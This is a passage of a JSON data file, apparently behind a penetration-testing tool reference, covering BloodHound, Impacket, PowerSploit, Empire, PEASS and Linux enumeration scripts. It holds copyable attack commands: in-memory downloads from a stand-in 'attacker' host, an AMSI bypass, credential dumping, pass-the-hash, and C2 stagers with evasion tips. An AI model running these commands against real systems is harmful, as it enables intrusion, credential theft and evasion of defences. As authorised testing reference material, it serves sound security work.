            "command": "BloodHound -> Upload Data -> Select corp_bh.zip"
          },
          {
            "title": "Highlight attack paths",
            "details": "Use pre-built queries (Shortest Paths to Domain Admins, RDP rights, etc.).",
            "command": "BloodHound Queries -> Shortest Paths to Domain Admins"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "BloodHound collection to privilege escalation",
        "stages": [
          {
            "label": "Collect",
            "description": "Run bloodhound-python or SharpHound to gather domain data.",
            "command": "bloodhound-python -c All -u svc -p Pass123! -d corp.local --zip"
          },
          {
            "label": "Analyze",
            "description": "Import into BloodHound and identify attack paths (e.g., RBCD, GMSA).",
            "command": "BloodHound Query: Find Shortest Paths to Domain Admins"
          },
          {
            "label": "Exploit",
            "description": "Use Impacket/PowerSploit to execute the identified chain.",
            "command": "addcomputer.py corp.local/svc:Pass123! -computer-name BH-WS01 -computer-pass Pass123!"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "INFO: Starting LDAP session",
        "meaning": "Collection phase begun; ensure required ports (389/636) are reachable.",
        "severity": "info"
      },
      {
        "indicator": "INFO: Compressing output into zip",
        "meaning": "Collectors finished; upload the resulting archive to BloodHound UI.",
        "severity": "info"
      },
      {
        "indicator": "ERROR: Access Denied",
        "meaning": "Account lacks permissions; try another user or specify --auth-kerberos.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Collection through SOCKS proxies",
        "scenario": "Run collectors over tunnels such as chisel or ligolo.",
        "command": "proxychains4 bloodhound-python -c All -d corp.local -u svc -p Pass123! -ns 127.0.0.1",
        "notes": [
          "Ensure proxychains config points to your SOCKS proxy.",
          "Use --auth-kerberos with a cached ticket for seamless auth."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "BloodHound docs",
        "url": "https://bloodhound.readthedocs.io/",
        "description": "Usage guides and data-model documentation."
      }
    ]
  },
  {
    "id": "impacket-scripts",
    "name": "Impacket Scripts",
    "summary": "Impacket is a collection of Python classes for working with network protocols. Includes many useful scripts for pentesting.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install Impacket via pipx to keep scripts isolated.",
        "steps": [
          {
            "detail": "python3 -m pip install --user pipx",
            "copyable": true
          },
          {
            "detail": "pipx install impacket",
            "copyable": true
          },
          {
            "detail": "impacket-wmiexec -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Use Kali packages and keep /usr/share/doc/python3-impacket examples updated.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y python3-impacket",
            "copyable": true
          },
          {
            "detail": "ls /usr/share/doc/python3-impacket/examples",
            "copyable": true
          },
          {
            "detail": "impacket-smbclient -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use the secureworks/impacket container for quick execution.",
        "steps": [
          {
            "detail": "docker pull secureworks/impacket",
            "copyable": true
          },
          {
            "detail": "docker run --rm secureworks/impacket impacket-smbclient -h",
            "copyable": true
          },
          {
            "detail": "docker run --rm secureworks/impacket impacket-wmiexec corp.local/administrator:Pass123!@dc01",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "SMB enumeration",
        "command": "smbmap.py -H 192.168.1.100 -u admin -p password",
        "notes": []
      },
      {
        "description": "NTLM relay",
        "command": "ntlmrelayx.py -tf targets.txt",
        "notes": []
      },
      {
        "description": "Kerberoasting",
        "command": "GetUserSPNs.py -dc domain.local -domain.local",
        "notes": []
      },
      {
        "description": "Secretsdump",
        "command": "secretsdump.py -hashes :hash@192.168.1.100",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-H",
        "description": "Target host"
      },
      {
        "flag": "-u",
        "description": "Username"
      },
      {
        "flag": "-p",
        "description": "Password"
      },
      {
        "flag": "-hashes",
        "description": "NTLM hashes"
      },
      {
        "flag": "-dc",
        "description": "Domain controller"
      },
      {
        "flag": "-smb2support",
        "description": "Enable SMB2 support"
      }
    ],
    "operational_tips": [
      "Use for protocol-specific attacks and enumeration.",
      "Combine with other tools for comprehensive testing.",
      "Document all findings and attack paths.",
      "Update regularly for latest protocol support."
    ],
    "step_sequences": [
      {
        "title": "Standard Impacket triad",
        "steps": [
          {
            "title": "Enumerate shares",
            "details": "List SMB shares using provided credentials.",
            "command": "impacket-smbclient corp.local/administrator:Pass123!@fileserver"
          },
          {
            "title": "Execute commands",
            "details": "Use wmiexec or psexec for remote command execution.",
            "command": "impacket-wmiexec corp.local/administrator:Pass123!@dc01 'whoami'"
          },
          {
            "title": "Dump secrets",
            "details": "Extract hashes or secrets for later cracking.",
            "command": "impacket-secretsdump corp.local/administrator:Pass123!@dc01"
          },
          {
            "title": "Replay",
            "details": "Use recovered hashes with other modules or Evil-WinRM.",
            "command": "impacket-psexec corp.local/administrator@dc01 -hashes :aad3b435b51404eeaad3b435b51404ee"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Credential harvest \u2192 Impacket lateral \u2192 Privilege escalation",
        "stages": [
          {
            "label": "Harvest",
            "description": "Dump hashes with secretsdump or mimikatz.",
            "command": "impacket-secretsdump corp.local/backup:Passw0rd@dc01"
          },
          {
            "label": "Lateral move",
            "description": "Use wmiexec/psexec with cracked hashes.",
            "command": "impacket-wmiexec corp.local/backup:'CrackedPass1!'@sql01"
          },
          {
            "label": "Escalate",
            "description": "Deploy WinPEAS or schedule tasks to escalate privileges further.",
            "command": "impacket-smbclient corp.local/backup:'CrackedPass1!'@sql01 -command 'put winpeas.exe C:\\Temp\\winpeas.exe'"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[*] Opening SVC service on dc01",
        "meaning": "psexec created/started the service; expect command output shortly.",
        "severity": "info"
      },
      {
        "indicator": "[-] SMB SessionError: STATUS_ACCESS_DENIED",
        "meaning": "Credentials lack required permissions or share access.",
        "severity": "warning"
      },
      {
        "indicator": "[*] Cleaning up...",
        "meaning": "Impacket is removing created services/files; wait for completion before disconnecting.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Kerberos auth",
        "scenario": "Use tickets instead of passwords when only Kerberos is allowed.",
        "command": "KRB5CCNAME=~/tickets/tgt.ccache impacket-wmiexec -k -no-pass corp.local/administrator@dc01",
        "notes": [
          "Generate tickets using getTGT.py or Rubeus.",
          "Combine with proxychains for tunneled access."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Impacket documentation",
        "url": "https://github.com/fortra/impacket",
        "description": "Script references and examples."
      }
    ]
  },
  {
    "id": "powersploit",
    "name": "PowerSploit",
    "summary": "PowerSploit is a collection of PowerShell modules that can be used to assist during penetration testing and post exploitation.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Clone the repository and stage modules for import.",
        "steps": [
          {
            "detail": "git clone https://github.com/PowerShellMafia/PowerSploit.git ~/loot/PowerSploit",
            "copyable": true
          },
          {
            "detail": "cd ~/loot/PowerSploit && git submodule update --init --recursive",
            "copyable": true
          },
          {
            "detail": "zip -r PowerSploit.zip PowerSploit",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via apt or use /usr/share/powersploit modules.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y powersploit",
            "copyable": true
          },
          {
            "detail": "ls /usr/share/powersploit/Recon",
            "copyable": true
          },
          {
            "detail": "cp -r /usr/share/powersploit ~/loot/powersploit",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Host modules via HTTPS/SMB for in-memory import on targets.",
        "steps": [
          {
            "detail": "python3 -m http.server 8443 --directory ~/loot/powersploit",
            "copyable": true
          },
          {
            "detail": "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('https://attacker:8443/PowerSploit/Recon/PowerView.ps1')\"",
            "copyable": true
          },
          {
            "detail": "powershell -c \"Import-Module PowerView\"",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Load PowerShell module",
        "command": "Import-Module .\\PowerSploit.psd1",
        "notes": []
      },
      {
        "description": "Invoke-Mimikatz",
        "command": "Invoke-Mimikatz -DumpCreds",
        "notes": []
      },
      {
        "description": "PowerShell reverse shell",
        "command": "Invoke-Shellcode -Shellcode \\$(shellcode)",
        "notes": []
      },
      {
        "description": "Bypass AMSI",
        "command": "Invoke-AmsiBypass",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "Import-Module",
        "description": "Load PowerShell module"
      },
      {
        "flag": "-Force",
        "description": "Force execution"
      },
      {
        "flag": "-DumpCreds",
        "description": "Dump credentials"
      },
      {
        "flag": "-Shellcode",
        "description": "Execute shellcode"
      }
    ],
    "operational_tips": [
      "Use for post-exploitation on Windows targets.",
      "Many modules for different attack scenarios.",
      "Be aware of modern PowerShell security features.",
      "Document all module executions and results."
    ],
    "step_sequences": [
      {
        "title": "Running PowerSploit modules",
        "steps": [
          {
            "title": "Load module",
            "details": "Import the required script in-memory to avoid touching disk.",
            "command": "powershell -ExecutionPolicy Bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')\""
          },
          {
            "title": "Enumerate domain",
            "details": "Use PowerView to list domain admins and ACLs.",
            "command": "powershell -c \"Get-DomainGroupMember -Identity 'Domain Admins'\""
          },
          {
            "title": "Execute privilege escalation checks",
            "details": "Run Privesc module to identify misconfigurations.",
            "command": "powershell -c \"Invoke-PrivEscAudit\""
          },
          {
            "title": "Cleanup",
            "details": "Remove imported modules if policy demands.",
            "command": "powershell -c \"Remove-Module PowerView\""
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "PowerSploit reconnaissance to exploitation",
        "stages": [
          {
            "label": "Recon",
            "description": "Use PowerView/PowerUp to map AD objects and misconfigs.",
            "command": "powershell -c \"Invoke-ShareFinder\""
          },
          {
            "label": "Exploit",
            "description": "Use Invoke-ACLScanner or Invoke-Kerberoast to gather credentials.",
            "command": "powershell -c \"Invoke-Kerberoast\""
          },
          {
            "label": "Pivot",
            "description": "Feed recovered creds into Evil-WinRM or Impacket.",
            "command": "evil-winrm -i fileserver -u svc_sql -p 'KerbPass!'"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[*] Found 4 Domain Admins",
        "meaning": "PowerView successfully enumerated group membership.",
        "severity": "info"
      },
      {
        "indicator": "[!] Invoke-ACLScanner identified WRITE_DACL",
        "meaning": "Potential escalation path; document affected object.",
        "severity": "high"
      },
      {
        "indicator": "WARNING: Script execution disabled",
        "meaning": "Set ExecutionPolicy or use in-memory IEX to bypass.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "AMSI bypass",
        "scenario": "Import PowerSploit on hardened endpoints.",
        "command": "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')\"",
        "notes": [
          "Use only when scope authorizes AMSI bypass techniques.",
          "Rotate hosting paths to evade signature-based controls."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "PowerSploit wiki",
        "url": "https://github.com/PowerShellMafia/PowerSploit",
        "description": "Module descriptions and usage."
      }
    ]
  },
  {
    "id": "empire",
    "name": "Empire",
    "summary": "Empire is a post-exploitation framework that includes agents, listeners, and modules for maintaining access.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install Starkiller/Empire via Docker or pip.",
        "steps": [
          {
            "detail": "git clone https://github.com/BC-SECURITY/Empire.git",
            "copyable": true
          },
          {
            "detail": "cd Empire && ./setup/install.sh",
            "copyable": true
          },
          {
            "detail": "./empire --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Use BC-Security package repo for the latest release.",
        "steps": [
          {
            "detail": "curl https://bc-security.gitlab.io/apt/gpg.key | sudo apt-key add -",
            "copyable": true
          },
          {
            "detail": "echo 'deb https://bc-security.gitlab.io/apt kali main' | sudo tee /etc/apt/sources.list.d/empire.list",
            "copyable": true
          },
          {
            "detail": "sudo apt update && sudo apt install -y empire starkiller",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run Empire in Docker when you need isolated C2 infrastructure.",
        "steps": [
          {
            "detail": "docker pull bcsecurity/empire:latest",
            "copyable": true
          },
          {
            "detail": "docker run -d -p 1337:1337 -p 5000:5000 bcsecurity/empire",
            "copyable": true
          },
          {
            "detail": "docker exec -it $(docker ps -q -f ancestor=bcsecurity/empire) ./ps-empire server",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Launch Empire",
        "command": "./empire",
        "notes": []
      },
      {
        "description": "Manage listeners",
        "command": "listeners",
        "notes": []
      },
      {
        "description": "Generate agent",
        "command": "uselistener http",
        "notes": []
      },
      {
        "description": "Execute resource script",
        "command": "resource script.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "listeners",
        "description": "Manage listeners"
      },
      {
        "flag": "uselistener",
        "description": "Create listener"
      },
      {
        "flag": "agents",
        "description": "Manage agents"
      },
      {
        "flag": "usemodule",
        "description": "Use module"
      },
      {
        "flag": "resource",
        "description": "Execute resource script"
      }
    ],
    "operational_tips": [
      "Generate multiple agent types for different targets.",
      "Document all agent communications and activities.",
      "Use encrypted communications for operational security.",
      "Combine with other post-exploitation tools."
    ],
    "step_sequences": [
      {
        "title": "Launching a listener and agent",
        "steps": [
          {
            "title": "Start server",
            "details": "Run Empire server and Starkiller/CLI to manage agents.",
            "command": "./empire server"
          },
          {
            "title": "Create listener",
            "details": "Configure HTTP listener with staging key and profiles.",
            "command": "(Empire) listeners http create Name=corp_http Host=0.0.0.0 Port=80"
          },
          {
            "title": "Generate stager",
            "details": "Build PowerShell launcher for delivery via phishing or lateral movement.",
            "command": "(Empire) usestager windows/launcher Listener=corp_http"
          },
          {
            "title": "Interact with agent",
            "details": "Task modules such as Invoke-Mimikatz or lateral movement utilities.",
            "command": "(Empire:AGENT) usemodule credentials/mimikatz/logonpasswords"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Empire C2 chain",
        "stages": [
          {
            "label": "Initial compromise",
            "description": "Deliver Empire launcher via phishing/webshell/PowerSploit.",
            "command": "powershell -ExecutionPolicy Bypass -NoP -W Hidden -Enc <launcher>"
          },
          {
            "label": "C2 operations",
            "description": "Use Empire modules for credential dumping and situational awareness.",
            "command": "(Empire:AGENT) usemodule credentials/mimikatz/logonpasswords"
          },
          {
            "label": "Lateral movement",
            "description": "Leverage agents to deploy Chisel/Ligolo or interact via Evil-WinRM.",
            "command": "(Empire:AGENT) usemodule lateral_movement/invoke_smbexec"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[*] Listener successfully started",
        "meaning": "HTTP(S) listener ready; ensure firewall rules allow inbound traffic.",
        "severity": "info"
      },
      {
        "indicator": "[*] Agent EMP123 checked in",
        "meaning": "New agent registered; begin tasking immediately.",
        "severity": "info"
      },
      {
        "indicator": "[!] Listener failed: port in use",
        "meaning": "Conflict on host port; adjust listener configuration.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "HTTPS listener with redirectors",
        "scenario": "Blend C2 traffic with legitimate HTTPS domains.",
        "command": "listeners http create Name=corp_https Host=redirector.corp.tld Port=443 CertPath=/opt/certs/corp.pem",
        "notes": [
          "Use nginx/Apache redirectors to front Empire listeners.",
          "Enable jitter and packet size randomization for OPSEC."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "BC-Security Empire docs",
        "url": "https://bc-security.gitbook.io/empire-wiki/",
        "description": "Official operator guide."
      }
    ]
  },
  {
    "id": "linpeas",
    "name": "LinPEAS",
    "summary": "LinPEAS is a script that searches for possible paths to escalate privileges on Linux/Unix systems.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Download the latest script and stage it for transfer.",
        "steps": [
          {
            "detail": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
            "copyable": true
          },
          {
            "detail": "chmod +x linpeas.sh",
            "copyable": true
          },
          {
            "detail": "sha256sum linpeas.sh",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "PEASS is packaged; keep /usr/share/peass up to date.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y peass",
            "copyable": true
          },
          {
            "detail": "ls /usr/share/peass/linPEAS",
            "copyable": true
          },
          {
            "detail": "cp /usr/share/peass/linPEAS/linpeas.sh ./linpeas.sh",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Serve linpeas via HTTP/SMB to compromised hosts.",
        "steps": [
          {
            "detail": "python3 -m http.server 8008 --directory $(pwd)",
            "copyable": true
          },
          {
            "detail": "curl http://attacker:8008/linpeas.sh -o /tmp/linpeas.sh",
            "copyable": true
          },
          {
            "detail": "chmod +x /tmp/linpeas.sh",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Run basic scan",
        "command": "./linpeas.sh",
        "notes": []
      },
      {
        "description": "Quiet mode",
        "command": "./linpeas.sh -q",
        "notes": []
      },
      {
        "description": "Check specific options",
        "command": "./linpeas.sh -o /tmp/output.txt",
        "notes": []
      },
      {
        "description": "With colors disabled",
        "command": "./linpeas.sh -nocolors",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-q",
        "description": "Quiet mode"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "-nocolors",
        "description": "Disable colors"
      },
      {
        "flag": "-w",
        "description": "Wait time between checks"
      },
      {
        "flag": "-P",
        "description": "Password for sudo"
      }
    ],
    "operational_tips": [
      "Run with different user contexts for comprehensive coverage.",
      "Save output for later analysis and correlation.",
      "Focus on high-severity findings first.",
      "Document all potential escalation paths."
    ],
    "step_sequences": [
      {
        "title": "Executing linpeas",
        "steps": [
          {
            "title": "Transfer",
            "details": "Upload linpeas to /tmp or /dev/shm on target.",
            "command": "scp linpeas.sh user@target:/tmp/linpeas.sh"
          },
          {
            "title": "Run",
            "details": "Execute with high verbosity to capture all checks.",
            "command": "./linpeas.sh -a"
          },
          {
            "title": "Collect output",
            "details": "Redirect output to file for later analysis.",
            "command": "./linpeas.sh -a | tee /tmp/linpeas.log"
          },
          {
            "title": "Review findings",
            "details": "Search for SUID, cron, and kernel exploit hints.",
            "command": "grep -n 'Interesting' /tmp/linpeas.log"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "linpeas \u2192 linux-smart-enumeration \u2192 exploit suggester",
        "stages": [
          {
            "label": "Baseline enumeration",
            "description": "Run linpeas to gather comprehensive host data.",
            "command": "./linpeas.sh -a"
          },
          {
            "label": "Focused enumeration",
            "description": "Use linux-smart-enumeration for lightweight validation.",
            "command": "lse.sh -l 1"
          },
          {
            "label": "Exploit recommendation",
            "description": "Feed kernel/version info into linux-exploit-suggester.",
            "command": "linux-exploit-suggester.sh > les.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] [SUID] Interesting SUID binary: /usr/bin/screen",
        "meaning": "Potential privesc via misconfigured SUID binary.",
        "severity": "high"
      },
      {
        "indicator": "[!] A new release of PEASS-ng is available",
        "meaning": "Update linpeas.sh for the latest checks.",
        "severity": "info"
      },
      {
        "indicator": "[+] [CRON] Writable cron folder",
        "meaning": "Check cron jobs for privilege escalation opportunities.",
        "severity": "medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Stealth mode",
        "scenario": "Reduce noise when running on production systems.",
        "command": "./linpeas.sh -s -o /tmp/linpeas_min.log",
        "notes": [
          "-s skips noisy checks; combine with tee to capture essential findings.",
          "Use -P to output in JSON for ingestion into reporting tools."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "PEASS-ng repo",
        "url": "https://github.com/carlospolop/PEASS-ng",
        "description": "Latest linpeas and changelog."
      }
    ]
  },
  {
    "id": "winpeas",
    "name": "WinPEAS",
    "summary": "WinPEAS is a script that searches for possible paths to escalate privileges on Windows systems.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Download the latest binary and host it for transfer.",
        "steps": [
          {
            "detail": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe",
            "copyable": true
          },
          {
            "detail": "sha256sum winPEASany.exe",
            "copyable": true
          },
          {
            "detail": "python3 -m http.server 8082 --directory $(pwd)",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Use the PEASS package and copy binaries to loot folders.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y peass",
            "copyable": true
          },
          {
            "detail": "cp /usr/share/peass/winPEAS/winPEASany.exe ~/loot/winpeas.exe",
            "copyable": true
          },
          {
            "detail": "cp /usr/share/peass/winPEAS/winPEASx64.exe ~/loot/winpeas64.exe",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Serve binaries via SMB/HTTP for Windows targets.",
        "steps": [
          {
            "detail": "impacket-smbserver loot $(pwd)",
            "copyable": true
          },
          {
            "detail": "copy \\\\attacker\\loot\\winPEASany.exe C:\\Temp\\winpeas.exe",
            "copyable": true
          },
          {
            "detail": "powershell -c \"Get-FileHash C:\\Temp\\winpeas.exe\"",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Run basic scan",
        "command": ".\\winPEAS.exe",
        "notes": []
      },
      {
        "description": "Check specific modules",
        "command": ".\\winPEAS.exe systeminfo",
        "notes": []
      },
      {
        "description": "Quiet mode",
        "command": ".\\winPEAS.exe quiet",
        "notes": []
      },
      {
        "description": "Output to file",
        "command": ".\\winPEAS.exe output C:\\temp\\results.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "systeminfo",
        "description": "System information"
      },
      {
        "flag": "processinfo",
        "description": "Process information"
      },
      {
        "flag": "quiet",
        "description": "Quiet mode"
      },
      {
        "flag": "output",
        "description": "Output file"
      },
      {
        "flag": "notcolor",
        "description": "No colors"
      }
    ],
    "operational_tips": [
      "Run with different privilege levels.",
      "Focus on services and scheduled tasks.",
      "Check for weak permissions and configurations.",
      "Document all findings for remediation."
    ],
    "step_sequences": [
      {
        "title": "Running winPEAS",
        "steps": [
          {
            "title": "Transfer",
            "details": "Upload winPEAS to the target (C:\\Temp recommended).",
            "command": "copy \\\\attacker\\loot\\winPEASany.exe C:\\Temp\\winpeas.exe"
          },
          {
            "title": "Execute",
            "details": "Run with verbose logging to capture all checks.",
            "command": "C:\\Temp\\winpeas.exe -a"
          },
          {
            "title": "Export output",
            "details": "Redirect output to a file for offline analysis.",
            "command": "C:\\Temp\\winpeas.exe > C:\\Temp\\winpeas.txt"
          },
          {
            "title": "Review",
            "details": "Search for high-value findings such as Unquoted Service Paths or vulnerable registry keys.",
            "command": "findstr /I \"[+]\" C:\\Temp\\winpeas.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "winPEAS \u2192 Windows exploit suggester",
        "stages": [
          {
            "label": "Baseline",
            "description": "Run winPEAS to gather OS/build info and privilege escalation hints.",
            "command": "C:\\Temp\\winpeas.exe -a"
          },
          {
            "label": "Exploit mapping",
            "description": "Feed systeminfo output into windows-exploit-suggester.",
            "command": "systeminfo > C:\\Temp\\sysinfo.txt"
          },
          {
            "label": "Remediation",
            "description": "Execute suggested exploits or misconfig fixes as allowed.",
            "command": "windows-exploit-suggester.py --database 2024-10-01-mssb.xls --systeminfo sysinfo.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] Interesting Services",
        "meaning": "Review for unquoted paths or weak ACLs.",
        "severity": "high"
      },
      {
        "indicator": "[+] Checking AlwaysInstallElevated",
        "meaning": "If Enabled=1, you can install MSI packages with SYSTEM rights.",
        "severity": "medium"
      },
      {
        "indicator": "[i] New release available",
        "meaning": "Download the latest build to ensure coverage of new checks.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Colorless output",
        "scenario": "Run winPEAS on constrained consoles without ANSI support.",
        "command": "C:\\Temp\\winpeas.exe -nocolor -log C:\\Temp\\winpeas.log",
        "notes": [
          "Use -systeminfo to dump systeminfo automatically for later tools.",
          "Combine with Evil-WinRM's upload function for quick execution."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "PEASS-ng release",
        "url": "https://github.com/carlospolop/PEASS-ng/releases",
        "description": "Latest winPEAS binaries."
      }
    ]
  },
  {
    "id": "linux-smart-enumeration",
    "name": "Linux Smart Enumeration",
    "summary": "Linux Smart Enumeration (lse) is a script for Linux enumeration focused on privilege escalation.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Download the lightweight script.",
        "steps": [
          {
            "detail": "wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh",
            "copyable": true
          },
          {
            "detail": "chmod +x lse.sh",
            "copyable": true
          },
          {
            "detail": "sha256sum lse.sh",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via apt package and copy script for usage.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y linux-smart-enumeration",
            "copyable": true
          },
          {
            "detail": "cp /usr/share/linux-smart-enumeration/lse.sh ./lse.sh",
            "copyable": true
          },
          {
            "detail": "chmod +x lse.sh",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Host script via HTTP for download on compromised hosts.",
        "steps": [
          {
            "detail": "python3 -m http.server 8085 --directory $(pwd)",
            "copyable": true
          },
          {
            "detail": "curl http://attacker:8085/lse.sh -o /tmp/lse.sh",
            "copyable": true
          },
          {
            "detail": "chmod +x /tmp/lse.sh",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Run basic enumeration",
        "command": "./lse.sh",
        "notes": []
      },
      {
        "description": "Specify level",
        "command": "./lse.sh -l 2",
        "notes": []
      },
      {
        "description": "Save output",
        "command": "./lse.sh -o /tmp/lse_output.txt",
        "notes": []
      },
      {
        "description": "With sudo check",
        "command": "./lse.sh -s",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-l",
        "description": "Level of detail (1-3)"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "-s",
        "description": "Check sudo permissions"
      },
      {
        "flag": "-i",
        "description": "Information gathering only"
      },
      {
        "flag": "-h",
        "description": "Show help"
      }
    ],
    "operational_tips": [
      "Use higher levels for more comprehensive enumeration.",
      "Combine with manual verification of findings.",
      "Focus on SUID binaries and sudo permissions.",
      "Document all potential privilege escalation vectors."
    ],
    "step_sequences": [
      {
        "title": "Running LSE",
        "steps": [
          {
            "title": "Transfer",
            "details": "Upload lse.sh to /tmp.",
            "command": "scp lse.sh user@target:/tmp/lse.sh"
          },
          {
            "title": "Quick scan",
            "details": "Run low-level checks that avoid heavy noise.",
            "command": "./lse.sh -l 1"
          },
          {
            "title": "Detailed scan",
            "details": "Run level 2 or 3 for deeper checks when authorized.",
            "command": "./lse.sh -l 2 -i"
          },
          {
            "title": "Review",
            "details": "Inspect the highlighted findings grouped by severity.",
            "command": "grep 'maybe' lse-report.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "LSE \u2192 LinPEAS cross-check",
        "stages": [
          {
            "label": "Lightweight checks",
            "description": "Run lse.sh first for quick wins on fragile boxes.",
            "command": "./lse.sh -l 1"
          },
          {
            "label": "Deep dive",
            "description": "Execute linpeas for comprehensive enumeration.",
            "command": "./linpeas.sh -a"
          },
          {
            "label": "Exploit",
            "description": "Use linux-exploit-suggester or manual techniques based on the findings.",
            "command": "linux-exploit-suggester.sh"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] Exploitable SUID binaries",
        "meaning": "Investigate suggested binaries for privilege escalation.",
        "severity": "high"
      },
      {
        "indicator": "[-] Kernel not listed",
        "meaning": "LSE could not match kernel version; gather manually for LES.",
        "severity": "info"
      },
      {
        "indicator": "[!] Services running as root",
        "meaning": "Check for writable service files or timers.",
        "severity": "medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Non-interactive mode",
        "scenario": "Run via cron or remote shells without prompts.",
        "command": "./lse.sh -l 3 -i -s report.txt",
        "notes": [
          "-s writes results to a file for offline review.",
          "Use -c to provide custom command wrappers (e.g., via sudo)."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "LSE project",
        "url": "https://github.com/diego-treitos/linux-smart-enumeration",
        "description": "Documentation and release binaries."
      }
    ]
  },
  {
    "id": "linux-exploit-suggester",
    "name": "Linux Exploit Suggester",
    "summary": "Linux Exploit Suggester is a tool that suggests possible exploits for Linux systems based on kernel version.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Download LES and keep databases current.",
        "steps": [
          {
            "detail": "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
            "copyable": true
          },
          {
            "detail": "chmod +x linux-exploit-suggester.sh",
            "copyable": true
          },
          {
            "detail": "sha256sum linux-exploit-suggester.sh",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Use the packaged script.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y linux-exploit-suggester",
            "copyable": true
          },
          {
            "detail": "cp /usr/share/linux-exploit-suggester/linux-exploit-suggester.sh ./les.sh",
            "copyable": true
          },
          {
            "detail": "chmod +x les.sh",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Serve script via HTTP or embed into pwncat/linpeas workflows.",
        "steps": [
          {
            "detail": "python3 -m http.server 8086 --directory $(pwd)",
            "copyable": true
          },
          {
